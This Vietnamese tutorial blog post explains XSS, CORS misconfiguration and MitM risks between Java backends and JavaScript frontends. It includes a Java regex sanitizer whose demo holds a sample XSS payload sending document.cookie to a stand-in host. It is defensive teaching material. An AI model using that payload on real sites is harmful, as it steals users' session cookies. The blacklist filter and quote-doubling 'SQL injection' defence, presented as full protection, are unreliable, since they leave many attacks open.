---
title: "Khóa Học #07: Nghiên cứu Bảo mật Hệ thống - Thiết lập lá chắn đa tầng cho thực thể Java và JavaScript"
date: 2025-12-21
tags: ["java", "javascript", "security", "cors", "xss", "fullstack-research", "cyber-security"]
categories: ["Java Network Research"]
draft: false
---

![Nghiên cứu bảo mật dữ liệu mạng](https://405cyse.com/wp-content/uploads/2025/05/4cd10cf78793671c50d7e0a0d45bddddf3300bf7.gif)

---

### 📍 Mục lục nội dung
1. [Phân tích thực thể: Các véc-tơ tấn công Fullstack điển hình](#1-phân-tích-thực-thể-các-véc-tơ-tấn-công-fullstack-điển-hình)
2. [Tấn công XSS, CORS Misconfiguration và MitM](#11-tấn-công-xss-cross-site-scripting)
3. [Nghiên cứu thực nghiệm: Bộ lọc bảo mật Java (Security Sanitizer)](#2-nghiên-cứu-thực-nghiệm-xây-dựng-bộ-lọc-bảo-mật-java-security-sanitizer)

---

Chào các bạn! Trong hành trình nghiên cứu sự kết nối giữa Java và JavaScript, chúng ta đã xây dựng được những "con đường" truyền tải dữ liệu tuyệt vời qua HTTP và JSON. Tuy nhiên, một câu hỏi sống còn đặt ra trong môi trường thực tế: **Làm sao để đảm bảo dữ liệu đó không bị đánh cắp hoặc bị can thiệp trái phép?**

Trong mô hình Fullstack, thực thể JavaScript (Frontend) thường là nơi dễ bị tổn thương nhất do mã nguồn phơi bày trên trình duyệt. Ngược lại, Java (Backend) là thành trì cuối cùng nắm giữ logic nghiệp vụ và cơ sở dữ liệu. Bài nghiên cứu số 7 này sẽ đi sâu vào việc thiết lập các lớp "giáp trụ" bảo mật để bảo vệ sự tương tác giữa hai thực thể này.

---

### 1. Phân tích thực thể: Các véc-tơ tấn công Fullstack điển hình

Qua quá trình đo lường và thực nghiệm, chúng ta xác định được 3 điểm yếu cốt lõi trong mối quan hệ Java-JS:



#### 1.1. Tấn công XSS (Cross-Site Scripting)
Kẻ tấn công lừa hệ thống lưu trữ mã độc JavaScript vào Database thông qua Java. Khi người dùng hợp lệ yêu cầu dữ liệu, trình duyệt của họ sẽ thực thi mã độc này, dẫn đến mất Token xác thực hoặc lộ thông tin nhạy cảm.

#### 1.2. CORS Misconfiguration
CORS (Cross-Origin Resource Sharing) là một cơ chế bảo mật quan trọng. Nếu Java Server cấu hình `Allow-Origin: *` một cách lỏng lẻo, các JavaScript từ các tên miền độc hại khác có thể dễ dàng gọi API của bạn để trích xuất dữ liệu của người dùng.

#### 1.3. Tấn công Man-in-the-Middle (MitM)
Dữ liệu JSON thô đi qua đường ống Internet nếu không được mã hóa (HTTPS) sẽ trở thành "mồi ngon" cho các công cụ bắt gói tin, để lộ toàn bộ cấu trúc dữ liệu mà chúng ta đã dày công nghiên cứu ở Bài 6.

---

### 2. Nghiên cứu thực nghiệm: Xây dựng Bộ lọc bảo mật Java (Security Sanitizer)

Để bảo vệ thực thể Java, chúng ta sẽ nghiên cứu cách "rửa sạch" mọi đầu vào từ JavaScript trước khi đưa vào xử lý sâu hơn.

```java
import java.util.regex.Pattern;

/**
 * Advanced Security Research Tool
 * Nghiên cứu cơ chế lọc mã độc và bảo vệ thực thể dữ liệu
 * Tác giả: Trương Quang Trưởng
 */
public class SecurityDataResearch {

    // Nghiên cứu các mẫu mã độc JavaScript phổ biến (XSS Filter)
    private static final Pattern[] XSS_PATTERNS = {
        Pattern.compile("<script>(.*?)</script>", Pattern.CASE_INSENSITIVE),
        Pattern.compile("src[\r\n]*=[\r\n]*\\\'(.*?)\\\'", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),
        Pattern.compile("eval\\((.*?)\\)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),
        Pattern.compile("javascript:", Pattern.CASE_INSENSITIVE)
    };

    public static String sanitize(String input) {
        if (input == null) return null;
        
        String cleanData = input;
        // Thực nghiệm quá trình làm sạch từng lớp
        for (Pattern scriptPattern : XSS_PATTERNS) {
            cleanData = scriptPattern.matcher(cleanData).replaceAll("[SECURE_REMOVED]");
        }
        
        // Chống SQL Injection cơ bản cho thực thể Java
        cleanData = cleanData.replace("'", "''");
        
        return cleanData;
    }

    public static void main(String[] args) {
        // Giả lập Payload JSON độc hại từ một JavaScript không tin cậy
        String maliciousPayload = "{\"comment\": \"Rất hay! <script>location.href='hack.com?key='+document.cookie</script>\"}";

        System.out.println("=== HỆ THỐNG NGHIÊN CỨU BẢO MẬT [TRƯỞNG] START ===");
        System.out.println("[INPUT] Dữ liệu gốc từ JS: " + maliciousPayload);

        String safeData = sanitize(maliciousPayload);

        System.out.println("[OUTPUT] Dữ liệu sau khi Java xử lý: " + safeData);
        System.out.println("[INFO] Trạng thái: Thực thể Java đã được bảo vệ thành công.");
    }
}